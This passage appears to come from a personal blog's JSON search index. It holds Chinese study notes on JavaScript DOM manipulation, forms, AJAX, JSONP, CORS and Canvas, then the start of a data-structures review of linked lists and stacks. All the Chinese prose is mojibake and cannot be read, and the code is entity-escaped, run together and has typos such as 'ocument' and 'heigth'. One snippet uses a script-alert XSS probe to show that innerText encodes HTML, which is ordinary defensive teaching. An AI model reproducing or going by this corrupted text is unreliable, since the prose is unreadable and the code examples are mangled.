()ï¼Œç›¸å½“äºç”¨æˆ·ç‚¹å‡»äº†æµè§ˆå™¨çš„â€œåé€€â€æˆ–â€œå‰è¿›â€æŒ‰é’®ã€‚ä½†ç°åœ¨ä¸ä½¿ç”¨ã€‚ æ“ä½œDOMç”±äºHTMLæ–‡æ¡£è¢«æµè§ˆå™¨è§£æåå°±æ˜¯ä¸€æ£µDOMæ ‘ï¼Œè¦æ”¹å˜HTMLçš„ç»“æ„ï¼Œå°±éœ€è¦é€šè¿‡JavaScriptæ¥æ“ä½œDOMã€‚ å§‹ç»ˆè®°ä½DOMæ˜¯ä¸€ä¸ªæ ‘å½¢ç»“æ„ã€‚æ“ä½œä¸€ä¸ªDOMèŠ‚ç‚¹å®é™…ä¸Šå°±æ˜¯è¿™ä¹ˆå‡ ä¸ªæ“ä½œï¼š æ›´æ–°ï¼šæ›´æ–°è¯¥DOMèŠ‚ç‚¹çš„å†…å®¹ï¼Œç›¸å½“äºæ›´æ–°äº†è¯¥DOMèŠ‚ç‚¹è¡¨ç¤ºçš„HTMLçš„å†…å®¹ï¼› éå†ï¼šéå†è¯¥DOMèŠ‚ç‚¹ä¸‹çš„å­èŠ‚ç‚¹ï¼Œä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼› æ·»åŠ ï¼šåœ¨è¯¥DOMèŠ‚ç‚¹ä¸‹æ–°å¢ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œç›¸å½“äºåŠ¨æ€å¢åŠ äº†ä¸€ä¸ªHTMLèŠ‚ç‚¹ï¼› åˆ é™¤ï¼šå°†è¯¥èŠ‚ç‚¹ä»HTMLä¸­åˆ é™¤ï¼Œç›¸å½“äºåˆ æ‰äº†è¯¥DOMèŠ‚ç‚¹çš„å†…å®¹ä»¥åŠå®ƒåŒ…å«çš„æ‰€æœ‰å­èŠ‚ç‚¹ã€‚ åœ¨æ“ä½œä¸€ä¸ªDOMèŠ‚ç‚¹å‰ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å„ç§æ–¹å¼å…ˆæ‹¿åˆ°è¿™ä¸ªDOMèŠ‚ç‚¹ã€‚æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯document.getElementById()å’Œdocument.getElementsByTagName()ï¼Œä»¥åŠCSSé€‰æ‹©å™¨document.getElementsByClassName()ã€‚ 12345document.getElementById(&#39;test&#39;); &#x2F;&#x2F; è¿”å›IDä¸º&#39;test&#39;çš„èŠ‚ç‚¹ï¼šocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;); &#x2F;&#x2F; å…ˆå®šä½IDä¸º&#39;test-table&#39;çš„èŠ‚ç‚¹ï¼Œå†è¿”å›å…¶å†…éƒ¨æ‰€æœ‰trèŠ‚ç‚¹ï¼šdocument.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;); &#x2F;&#x2F; å…ˆå®šä½IDä¸º&#39;test-div&#39;çš„èŠ‚ç‚¹ï¼Œå†è¿”å›å…¶å†…éƒ¨æ‰€æœ‰classåŒ…å«redçš„èŠ‚ç‚¹ï¼štest.firstElementChild &#x2F;&#x2F;testä¸‹ç¬¬ä¸€ä¸ªç»“ç‚¹test.lastElementChild &#x2F;&#x2F;testä¸‹æœ€åä¸€ä¸ªç»“ç‚¹ ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨querySelector()å’ŒquerySelectorAll()ï¼Œéœ€è¦äº†è§£selectorè¯­æ³•ï¼Œç„¶åä½¿ç”¨æ¡ä»¶æ¥è·å–èŠ‚ç‚¹ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚ ä½œä¸š 12345678910111213141516171819202122232425&lt;!-- HTMLç»“æ„ --&gt;&lt;div id=\"test-div\"&gt;&lt;div class=\"c-red\"&gt; &lt;p id=\"test-p\"&gt;JavaScript&lt;/p&gt; &lt;p&gt;Java&lt;/p&gt; &lt;/div&gt; &lt;div class=\"c-red c-green\"&gt; &lt;p&gt;Python&lt;/p&gt; &lt;p&gt;Ruby&lt;/p&gt; &lt;p&gt;Swift&lt;/p&gt; &lt;/div&gt; &lt;div class=\"c-green\"&gt; &lt;p&gt;Scheme&lt;/p&gt; &lt;p&gt;Haskell&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;// é€‰æ‹©&lt;p&gt;JavaScript&lt;/p&gt;:var js = document.getElementById('test-p');// é€‰æ‹©&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:var arr = document.getElementsByClassName('c-red')[1].getElementsByTagName('p');// é€‰æ‹©&lt;p&gt;Haskell&lt;/p&gt;:var haskell = document.getElementsByClassName('c-green')[1].lastElementChild; æ›´æ–°DOMä¸€ç§æ˜¯ä¿®æ”¹innerHTMLå±æ€§ï¼Œè¿™ä¸ªæ–¹å¼éå¸¸å¼ºå¤§ï¼Œä¸ä½†å¯ä»¥ä¿®æ”¹ä¸€ä¸ªDOMèŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹ï¼Œè¿˜å¯ä»¥ç›´æ¥é€šè¿‡HTMLç‰‡æ®µä¿®æ”¹DOMèŠ‚ç‚¹å†…éƒ¨çš„å­æ ‘ 1234&#x2F;&#x2F;è·å–&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;var p &#x3D; document.getElementById(&#39;p&#39;);p.innerHTML &#x3D; &#39;ABC&#39;&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt; ç¬¬äºŒç§æ˜¯ä¿®æ”¹innerTextæˆ–textContentå±æ€§ï¼Œè¿™æ ·å¯ä»¥è‡ªåŠ¨å¯¹å­—ç¬¦ä¸²è¿›è¡ŒHTMLç¼–ç ï¼Œä¿è¯æ— æ³•è®¾ç½®ä»»ä½•HTMLæ ‡ç­¾ 123456&#x2F;&#x2F; è·å–&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;var p &#x3D; document.getElementById(&#39;p-id&#39;);&#x2F;&#x2F; è®¾ç½®æ–‡æœ¬:p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;&#x2F;&#x2F; HTMLè¢«è‡ªåŠ¨ç¼–ç ï¼Œæ— æ³•è®¾ç½®ä¸€ä¸ª&lt;script&gt;èŠ‚ç‚¹:&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt; æ’å…¥DOMä¸€ä¸ªæ˜¯ä½¿ç”¨appendChildï¼ŒæŠŠä¸€ä¸ªå­èŠ‚ç‚¹æ·»åŠ åˆ°çˆ¶èŠ‚ç‚¹çš„æœ€åä¸€ä¸ªå­èŠ‚ç‚¹ã€‚ 12345678910111213&lt;!-- HTMLç»“æ„ --&gt;&lt;p id=\"js\"&gt;JavaScript&lt;/p&gt;&lt;div id=\"list\"&gt; &lt;p id=\"java\"&gt;Java&lt;/p&gt; &lt;p id=\"python\"&gt;Python&lt;/p&gt; &lt;p id=\"scheme\"&gt;Scheme&lt;/p&gt;&lt;/div&gt;var list = document.getElementById('list');js = document.createElement('p');js.id = 'js';js.innerText = 'javascript';list.appendChild(js); å¦ä¸€ä¸ªæ˜¯insertBeforeï¼Œå¯ä»¥ä½¿ç”¨parentElement.insertBefore(newElement, referenceElement); 1234567var list = document.getElementById('list'), ref = document.getElementById('python'), haskell = document.createElement('p');haskell.id = 'haskell';haskell.innerText = 'Haskell';list.insertBefore(haskell, ref); åˆ é™¤DOM12345678&lt;div id=\"parent\"&gt; &lt;p&gt;First&lt;/p&gt; &lt;p&gt;Second&lt;/p&gt;&lt;/div&gt;var parent = document.getElementById('parent');parent.removeChild(parent.children[0]);parent.removeChild(parent.children[1]); // &lt;-- æµè§ˆå™¨æŠ¥é”™ æµè§ˆå™¨æŠ¥é”™ï¼šparent.children[1]ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„èŠ‚ç‚¹ã€‚åŸå› å°±åœ¨äºï¼Œå½“&lt;p&gt;First&lt;/p&gt;èŠ‚ç‚¹è¢«åˆ é™¤åï¼Œparent.childrençš„èŠ‚ç‚¹æ•°é‡å·²ç»ä»2å˜ä¸ºäº†1ï¼Œç´¢å¼•[1]å·²ç»ä¸å­˜åœ¨äº†ã€‚ æ“ä½œè¡¨å•HTMLè¡¨å•çš„è¾“å…¥æ§ä»¶ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š æ–‡æœ¬æ¡†ï¼Œå¯¹åº”çš„&lt;input type=&quot;text&quot;&gt;ï¼Œç”¨äºè¾“å…¥æ–‡æœ¬ï¼› å£ä»¤æ¡†ï¼Œå¯¹åº”çš„&lt;input type=&quot;password&quot;&gt;ï¼Œç”¨äºè¾“å…¥å£ä»¤ï¼› å•é€‰æ¡†ï¼Œå¯¹åº”çš„&lt;input type=&quot;radio&quot;&gt;ï¼Œç”¨äºé€‰æ‹©ä¸€é¡¹ï¼› å¤é€‰æ¡†ï¼Œå¯¹åº”çš„&lt;input type=&quot;checkbox&quot;&gt;ï¼Œç”¨äºé€‰æ‹©å¤šé¡¹ï¼› ä¸‹æ‹‰æ¡†ï¼Œå¯¹åº”çš„&lt;select&gt;ï¼Œç”¨äºé€‰æ‹©ä¸€é¡¹ï¼› éšè—æ–‡æœ¬ï¼Œå¯¹åº”çš„&lt;input type=&quot;hidden&quot;&gt;ï¼Œç”¨æˆ·ä¸å¯è§ï¼Œä½†è¡¨å•æäº¤æ—¶ä¼šæŠŠéšè—æ–‡æœ¬å‘é€åˆ°æœåŠ¡å™¨ã€‚ è·å–å€¼12var input &#x3D; document.getElementById(&#39;email&#39;);input.value &#x2F;&#x2F;ç”¨æˆ·è¾“å…¥çš„å€¼ è®¾ç½®å€¼12var input &#x3D; document.getElementById(&#39;email&#39;);input.value &#x3D; &#39;test&#39;; &#x2F;&#x2F;æ–‡æœ¬æ¡†å†…å®¹å·²è¢«è®¾ç½® HTML5æ§ä»¶HTML5æ–°å¢äº†å¤§é‡æ ‡å‡†æ§ä»¶ï¼Œå¸¸ç”¨çš„åŒ…æ‹¬dateã€datetimeã€datetime-localã€colorç­‰ï¼Œå®ƒä»¬éƒ½ä½¿ç”¨&lt;input&gt;æ ‡ç­¾ã€‚ æäº¤è¡¨å•æ–¹å¼ä¸€æ˜¯é€šè¿‡&lt;form&gt;å…ƒç´ çš„submit()æ–¹æ³•æäº¤ä¸€ä¸ªè¡¨å•ï¼Œä¾‹å¦‚ï¼Œå“åº”ä¸€ä¸ª&lt;button&gt;çš„clickäº‹ä»¶ï¼Œåœ¨JavaScriptä»£ç ä¸­æäº¤è¡¨å•ã€‚ 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=\"test-form\"&gt; &lt;input type=\"text\" name=\"test\"&gt; &lt;button type=\"button\" onclick=\"doSubmitForm()\"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function doSubmitForm() &#123; var form = document.getElementById('test-form'); // å¯ä»¥åœ¨æ­¤ä¿®æ”¹formçš„input... // æäº¤form: form.submit();&#125;&lt;/script&gt; ç¬¬äºŒç§æ–¹å¼æ˜¯å“åº”&lt;form&gt;æœ¬èº«çš„onsubmitäº‹ä»¶ï¼Œåœ¨æäº¤formæ—¶ä½œä¿®æ”¹ã€‚ 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=\"test-form\" onsubmit=\"return checkForm()\"&gt; &lt;input type=\"text\" name=\"test\"&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function checkForm() &#123; var form = document.getElementById('test-form'); // å¯ä»¥åœ¨æ­¤ä¿®æ”¹formçš„input... // ç»§ç»­ä¸‹ä¸€æ­¥: return true;&#125;&lt;/script&gt; æ“ä½œæ–‡ä»¶åœ¨HTMLè¡¨å•ä¸­ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„å”¯ä¸€æ§ä»¶å°±æ˜¯&lt;input type=&quot;file&quot;&gt;ã€‚ æ³¨æ„ï¼šå½“ä¸€ä¸ªè¡¨å•åŒ…å«&lt;input type=&quot;file&quot;&gt;æ—¶ï¼Œè¡¨å•çš„enctypeå¿…é¡»æŒ‡å®šä¸ºmultipart/form-dataï¼Œmethodå¿…é¡»æŒ‡å®šä¸ºpostï¼Œæµè§ˆå™¨æ‰èƒ½æ­£ç¡®ç¼–ç å¹¶ä»¥multipart/form-dataæ ¼å¼å‘é€è¡¨å•çš„æ•°æ®ã€‚ å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨åªå…è®¸ç”¨æˆ·ç‚¹å‡»&lt;input type=&quot;file&quot;&gt;æ¥é€‰æ‹©æœ¬åœ°æ–‡ä»¶ï¼Œç”¨JavaScriptå¯¹&lt;input type=&quot;file&quot;&gt;çš„valueèµ‹å€¼æ˜¯æ²¡æœ‰ä»»ä½•æ•ˆæœçš„ã€‚å½“ç”¨æˆ·é€‰æ‹©äº†ä¸Šä¼ æŸä¸ªæ–‡ä»¶åï¼ŒJavaScriptä¹Ÿæ— æ³•è·å¾—è¯¥æ–‡ä»¶çš„çœŸå®è·¯å¾„ã€‚ *AJAXå¦‚æœè¦è®©ç”¨æˆ·ç•™åœ¨å½“å‰é¡µé¢ä¸­ï¼ŒåŒæ—¶å‘å‡ºæ–°çš„HTTPè¯·æ±‚ï¼Œå°±å¿…é¡»ç”¨JavaScriptå‘é€è¿™ä¸ªæ–°è¯·æ±‚ï¼Œæ¥æ”¶åˆ°æ•°æ®åï¼Œå†ç”¨JavaScriptæ›´æ–°é¡µé¢ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç”¨æˆ·å°±æ„Ÿè§‰è‡ªå·±ä»ç„¶åœç•™åœ¨å½“å‰é¡µé¢ï¼Œä½†æ˜¯æ•°æ®å´å¯ä»¥ä¸æ–­åœ°æ›´æ–°ã€‚ ç”¨JavaScriptå†™ä¸€ä¸ªå®Œæ•´çš„AJAXä»£ç å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼šAJAXè¯·æ±‚æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦é€šè¿‡å›è°ƒå‡½æ•°è·å¾—å“åº”ã€‚ å½“åˆ›å»ºäº†XMLHttpRequestå¯¹è±¡åï¼Œè¦å…ˆè®¾ç½®onreadystatechangeçš„å›è°ƒå‡½æ•°ã€‚åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œé€šå¸¸æˆ‘ä»¬åªéœ€é€šè¿‡readyState === 4åˆ¤æ–­è¯·æ±‚æ˜¯å¦å®Œæˆï¼Œå¦‚æœå·²å®Œæˆï¼Œå†æ ¹æ®status === 200åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªæˆåŠŸçš„å“åº”ã€‚ XMLHttpRequestå¯¹è±¡çš„open()æ–¹æ³•æœ‰3ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šæ˜¯GETè¿˜æ˜¯POSTï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šURLåœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šæ˜¯å¦ä½¿ç”¨å¼‚æ­¥ï¼Œé»˜è®¤æ˜¯trueï¼Œæ‰€ä»¥ä¸ç”¨å†™ã€‚ æ³¨æ„ï¼Œåƒä¸‡ä¸è¦æŠŠç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šä¸ºfalseï¼Œå¦åˆ™æµè§ˆå™¨å°†åœæ­¢å“åº”ï¼Œç›´åˆ°AJAXè¯·æ±‚å®Œæˆã€‚å¦‚æœè¿™ä¸ªè¯·æ±‚è€—æ—¶10ç§’ï¼Œé‚£ä¹ˆ10ç§’å†…ä½ ä¼šå‘ç°æµè§ˆå™¨å¤„äºâ€œå‡æ­»â€çŠ¶æ€ã€‚ æœ€åè°ƒç”¨send()æ–¹æ³•æ‰çœŸæ­£å‘é€è¯·æ±‚ã€‚GETè¯·æ±‚ä¸éœ€è¦å‚æ•°ï¼ŒPOSTè¯·æ±‚éœ€è¦æŠŠbodyéƒ¨åˆ†ä»¥å­—ç¬¦ä¸²æˆ–è€…FormDataå¯¹è±¡ä¼ è¿›å»ã€‚ å®‰å…¨é™åˆ¶ ä¸Šé¢ä»£ç çš„URLä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœä½ æŠŠå®ƒæ”¹ä¸º&#39;http://www.sina.com.cn/&#39;ï¼Œå†è¿è¡Œï¼Œè‚¯å®šæŠ¥é”™ã€‚åœ¨Chromeçš„æ§åˆ¶å°é‡Œï¼Œè¿˜å¯ä»¥çœ‹åˆ°é”™è¯¯ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒJavaScriptåœ¨å‘é€AJAXè¯·æ±‚æ—¶ï¼ŒURLçš„åŸŸåå¿…é¡»å’Œå½“å‰é¡µé¢å®Œå…¨ä¸€è‡´ã€‚å®Œå…¨ä¸€è‡´çš„æ„æ€æ˜¯ï¼ŒåŸŸåè¦ç›¸åŒï¼ˆwww.example.comå’Œexample.comä¸åŒï¼‰ï¼Œåè®®è¦ç›¸åŒï¼ˆhttpå’Œhttpsä¸åŒï¼‰ï¼Œç«¯å£å·è¦ç›¸åŒï¼ˆé»˜è®¤æ˜¯:80ç«¯å£ï¼Œå®ƒå’Œ:8080å°±ä¸åŒï¼‰ã€‚æœ‰çš„æµè§ˆå™¨å£å­æ¾ä¸€ç‚¹ï¼Œå…è®¸ç«¯å£ä¸åŒï¼Œå¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šä¸¥æ ¼éµå®ˆè¿™ä¸ªé™åˆ¶ã€‚ JSè¯·æ±‚å¤–åŸŸçš„URLï¼š ä¸€æ˜¯é€šè¿‡Flashæ’ä»¶å‘é€HTTPè¯·æ±‚ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç»•è¿‡æµè§ˆå™¨çš„å®‰å…¨é™åˆ¶ï¼Œä½†å¿…é¡»å®‰è£…Flashï¼Œå¹¶ä¸”è·ŸFlashäº¤äº’ã€‚ä¸è¿‡Flashç”¨èµ·æ¥éº»çƒ¦ï¼Œè€Œä¸”ç°åœ¨ç”¨å¾—ä¹Ÿè¶Šæ¥è¶Šå°‘äº†ã€‚ äºŒæ˜¯é€šè¿‡åœ¨åŒæºåŸŸåä¸‹æ¶è®¾ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ¥è½¬å‘ï¼ŒJavaScriptè´Ÿè´£æŠŠè¯·æ±‚å‘é€åˆ°ä»£ç†æœåŠ¡å™¨ï¼šä»£ç†æœåŠ¡å™¨å†æŠŠç»“æœè¿”å›ï¼Œè¿™æ ·å°±éµå®ˆäº†æµè§ˆå™¨çš„åŒæºç­–ç•¥ã€‚è¿™ç§æ–¹å¼éº»çƒ¦ä¹‹å¤„åœ¨äºéœ€è¦æœåŠ¡å™¨ç«¯é¢å¤–åšå¼€å‘ã€‚ ç¬¬ä¸‰ç§æ–¹å¼ç§°ä¸ºJSONPï¼Œå®ƒæœ‰ä¸ªé™åˆ¶ï¼Œåªèƒ½ç”¨GETè¯·æ±‚ï¼Œå¹¶ä¸”è¦æ±‚è¿”å›JavaScriptã€‚è¿™ç§æ–¹å¼è·¨åŸŸå®é™…ä¸Šæ˜¯åˆ©ç”¨äº†æµè§ˆå™¨å…è®¸è·¨åŸŸå¼•ç”¨JavaScriptèµ„æºï¼š 123456789&lt;html&gt;&lt;head&gt; &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt; ...&lt;&#x2F;head&gt;&lt;body&gt;...&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; JSONPé€šå¸¸ä»¥å‡½æ•°è°ƒç”¨çš„å½¢å¼è¿”å›ï¼Œä¾‹å¦‚ï¼Œè¿”å›JavaScriptå†…å®¹å¦‚ä¸‹ï¼š 1foo(&#39;data&#39;); è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å¦‚æœåœ¨é¡µé¢ä¸­å…ˆå‡†å¤‡å¥½foo()å‡½æ•°ï¼Œç„¶åç»™é¡µé¢åŠ¨æ€åŠ ä¸€ä¸ª&lt;script&gt;èŠ‚ç‚¹ï¼Œç›¸å½“äºåŠ¨æ€è¯»å–å¤–åŸŸçš„JavaScriptèµ„æºï¼Œæœ€åå°±ç­‰ç€æ¥æ”¶å›è°ƒäº†ã€‚ ä»¥163çš„è‚¡ç¥¨æŸ¥è¯¢URLä¸ºä¾‹ï¼Œå¯¹äºURLï¼šhttp://api.money.126.net/data/feed/0000001,1399001?callback=refreshPriceï¼Œä½ å°†å¾—åˆ°å¦‚ä¸‹è¿”å›ï¼š 1refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;); å› æ­¤æˆ‘ä»¬éœ€è¦é¦–å…ˆåœ¨é¡µé¢ä¸­å‡†å¤‡å¥½å›è°ƒå‡½æ•°ï¼š 12345678function refreshPrice(data) &#123; var p &#x3D; document.getElementById(&#39;test-jsonp&#39;); p.innerHTML &#x3D; &#39;å½“å‰ä»·æ ¼ï¼š&#39; + data[&#39;0000001&#39;].name +&#39;: &#39; + data[&#39;0000001&#39;].price + &#39;ï¼›&#39; + data[&#39;1399001&#39;].name + &#39;: &#39; + data[&#39;1399001&#39;].price;&#125; å½“å‰ä»·æ ¼ï¼šä¸Šè¯æŒ‡æ•°: 3310.01ï¼›æ·±è¯æˆæŒ‡: 13637.883 åˆ·æ–° æœ€åç”¨getPrice()å‡½æ•°è§¦å‘ï¼š 1234567function getPrice() &#123; var js &#x3D; document.createElement(&#39;script&#39;), head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0]; js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;; head.appendChild(js);&#125; å°±å®Œæˆäº†è·¨åŸŸåŠ è½½æ•°æ®ã€‚ CORS CORSå…¨ç§°Cross-Origin Resource Sharing æœ¬åŸŸï¼šOriginï¼Œä¹Ÿå°±æ˜¯æµè§ˆå™¨å½“å‰é¡µé¢çš„åŸŸã€‚ å¤–åŸŸï¼šæŒ‡å‘çš„è®¿é—®ç½‘é¡µ å½“JavaScriptå‘å¤–åŸŸå‘èµ·è¯·æ±‚åï¼Œæµè§ˆå™¨æ”¶åˆ°å“åº”åï¼Œé¦–å…ˆæ£€æŸ¥Access-Control-Allow-Originæ˜¯å¦åŒ…å«æœ¬åŸŸï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ­¤æ¬¡è·¨åŸŸè¯·æ±‚æˆåŠŸï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¯·æ±‚å¤±è´¥ï¼ŒJavaScriptå°†æ— æ³•è·å–åˆ°å“åº”çš„ä»»ä½•æ•°æ®ã€‚ PromisePromiseå¯¹è±¡å…ˆç»Ÿä¸€æ‰§è¡ŒAJAXé€»è¾‘ï¼Œä¸å…³å¿ƒå¦‚ä½•å¤„ç†ç»“æœï¼Œç„¶åï¼Œæ ¹æ®ç»“æœæ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œåœ¨å°†æ¥çš„æŸä¸ªæ—¶å€™è°ƒç”¨successå‡½æ•°æˆ–failå‡½æ•°ã€‚ å¯¹Promiseå’ŒAJAXç†è§£è¿˜ä¸æ˜¯å¾ˆæ·±åˆ»ï¼Œå›å¤´ç»§ç»­çœ‹ã€‚ CanvasCanvasæ˜¯HTML5æ–°å¢çš„ç»„ä»¶ï¼Œå®ƒå°±åƒä¸€å—å¹•å¸ƒï¼Œå¯ä»¥ç”¨JavaScriptåœ¨ä¸Šé¢ç»˜åˆ¶å„ç§å›¾è¡¨ã€åŠ¨ç”»ç­‰ã€‚ 1234&lt;!-- HTMLä»£ç  --&gt;&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt; &lt;p&gt;ä½ çš„æµè§ˆå™¨ä¸æ”¯æŒCanvas&lt;&#x2F;p&gt;&lt;&#x2F;canvas&gt; åé¢çš„jQueryï¼ŒNode.jså’ŒReactä¹‹åå†çœ‹ã€‚","categories":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"},{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"æ•°æ®ç»“æ„å¤ä¹ ","slug":"æ•°æ®ç»“æ„å¤ä¹ ","date":"2020-06-30T07:45:07.000Z","updated":"2020-11-20T14:20:13.640Z","comments":true,"path":"2020/06/30/æ•°æ®ç»“æ„å¤ä¹ /","link":"","permalink":"https://pz1o.top/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/","excerpt":"","text":"æ•°æ®ç»“æ„å¤ä¹ æ ¹æ®è€å¸ˆé‡ç‚¹ï¼Œå¤ä¹ æ•°æ®ç»“æ„ã€‚ çº¿æ€§è¡¨å¾ªç¯é“¾è¡¨å¾ªç¯é“¾è¡¨çš„äº§ç”Ÿï¼šåœ¨å•é“¾è¡¨ä¸­ï¼Œï¼ˆ1ï¼‰åªçŸ¥é“ä¸€ä¸ªç»“ç‚¹ï¼Œæƒ³çŸ¥é“æ‰€æœ‰ç»“ç‚¹æ˜¯ä¸å¤ªè¡Œçš„ã€‚ï¼ˆ2ï¼‰å¦‚æœè¦æ‰¾ä¸€ä¸ªç»“ç‚¹çš„ç›´æ¥å‰é©±ç»“ç‚¹ï¼Œéœ€è¦ä»è¡¨ç«¯ä¸€ä¸ªä¸€ä¸ªç»“ç‚¹æŸ¥æ‰¾ï¼Œæ—¶é—´å¼€é”€åˆ°è¾¾äº†Oï¼ˆnï¼‰ã€‚ å¾ªç¯é“¾è¡¨çš„æ¦‚å¿µå°†å•é“¾è¡¨çš„é¦–å°¾ç›¸è¿ï¼Œä½¿ç»ˆç«¯ç»“ç‚¹çš„æŒ‡é’ˆåŸŸæŒ‡å‘å¤´ç»“ç‚¹ï¼Œæ„æˆå•å‘å¾ªç¯é“¾è¡¨ã€‚ å¾ªç¯é“¾è¡¨ä¸­å¯ä»¥å¸¦å¤´æŒ‡é’ˆå’Œå°¾æŒ‡é’ˆã€‚ å¤´æŒ‡é’ˆï¼š å°¾æŒ‡é’ˆï¼š å¾ªç¯é“¾è¡¨çš„æ’å…¥ 123//å…·ä½“æ“ä½œs-&gt;link = p-&gt;link;p-&gt;link = s; åŒå‘é“¾è¡¨åŒå‘é“¾è¡¨çš„äº§ç”Ÿï¼šè§£å†³å•é“¾è¡¨ä¸­çš„ï¼ˆ2ï¼‰ åŒå‘é“¾è¡¨çš„æ¦‚å¿µåŒå‘é“¾è¡¨ä¸­çš„æ¯ä¸ªç»“ç‚¹éƒ½æœ‰ä¸€ä¸ªå‰é©±æŒ‡é’ˆå’Œä¸€ä¸ªåç»§æŒ‡é’ˆå’Œæ•°æ®åŸŸã€‚ 1p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink; åŒå‘é“¾è¡¨çš„æ’å…¥åŒå‘é“¾è¡¨çš„æ’å…¥åˆ†ä¸ºå‰é©±æ–¹å‘çš„æ’å…¥å’Œåç»§æ–¹å‘çš„æ’å…¥â€˜ã€‚ åç»§: 12345&#x2F;&#x2F;å…·ä½“æ“ä½œnewnode-&gt;rlink &#x3D; current-&gt;rlink;current-&gt;rlink &#x3D; newnode;newnode-&gt;rlink-&gt;llink &#x3D; newnode;newnode-&gt;llink &#x3D; current; å‰é©±ï¼ˆç›¸å½“äºåå‘çš„åç»§ï¼‰ï¼š 12345&#x2F;&#x2F;å…·ä½“æ“ä½œnewnode-&gt;llink &#x3D; current-&gt;llink;current-&gt;llink &#x3D; newnode;newnode-&gt;llink-&gt;rlink &#x3D; newnode;newnode-&gt;rlink &#x3D; current; åŒå‘é“¾è¡¨çš„åˆ é™¤ 123&#x2F;&#x2F;å…·ä½“æ“ä½œcurrent-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink; æ ˆæ ˆçš„å®šä¹‰ åªå…è®¸åœ¨ä¸€ç«¯æ’å…¥å’Œåˆ é™¤çš„çº¿æ€§è¡¨ã€‚ï¼ˆåè¿›å…ˆå‡ºï¼‰ æ ˆé¡¶ï¼šå…è®¸æ’å…¥å’Œåˆ é™¤çš„ä¸€ç«¯ã€‚ æ ˆåº•ï¼šä¸å…è®¸æ’å…¥å’Œåˆ é™¤çš„ä¸€ç«¯ã€‚ é¡ºåºæ ˆ æ ˆé¡¶æŒ‡é’ˆtop=maxsize-1ï¼Œåˆ™è¡¨ç¤ºæ ˆæ»¡ã€‚ åˆ—è½¦è°ƒåº¦é—®é¢˜ å¦‚ä¸Šå›¾æ‰€è¿°ï¼Œæœ‰å¤šå°‘ç§ä¸åŒçš„å‡ºæ ˆåºåˆ—ï¼Ÿ 